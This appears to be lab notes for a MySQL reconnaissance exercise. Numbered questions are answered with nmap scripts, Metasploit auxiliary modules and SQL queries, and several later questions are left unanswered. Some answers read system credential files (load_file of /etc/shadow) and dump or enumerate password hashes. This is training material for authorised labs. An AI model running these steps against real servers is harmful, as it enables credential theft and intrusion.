
MySQL Recon: Basics

1.  What is the version of MySQL server?
```
nmap [ip] -sV -sC
```
- MySQL 5.5.62-0ubuntu0.14.04.1

3.  What command is used to connect to remote MySQL database?
```
mysql -u [username] -h [ip] -p
```

5.  How many databases are present on the database server?
```
show databases;
```

7.  How many records are present in table “authors”? This table is present inside the “books” database.
```
use books;

select * from authors;
```

9.  Dump the schema of all databases from the server using suitable metasploit module?
```
auxiliary(scanner/mysql/mysql_schemadump) // also provides a .txt file with it;
```

11.  How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
```
auxiliary(scanner/mysql/mysql_writable_dirs)

```

13.  How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
```
auxiliary(scanner/mysql/mysql_file_enum)

```

15.  Find the system password hash for user "root".
```
nmap --script mysql-dump-hashes --script-args='username=root' -p 3306 192.12.132.3

select load_file('/etc/shadow');
```

17.  How many database users are present on the database server? Lists their names and password hashes.
```
auxiliary(scanner/mysql/mysql_hashdump)
```

19.  Check whether anonymous login is allowed on MySQL Server.
```
mysql -h 192.82.22.3
```

21.  Check whether “InteractiveClient” capability is supported on the MySQL server.
```

```

23.  Enumerate the users present on MySQL database server using mysql-users nmap script.
24.  List all databases stored on the MySQL Server using nmap script.
25.  Find the data directory used by mysql server using nmap script.
26.  Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
27.  Dump all user hashes using  nmap script.
28.  Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.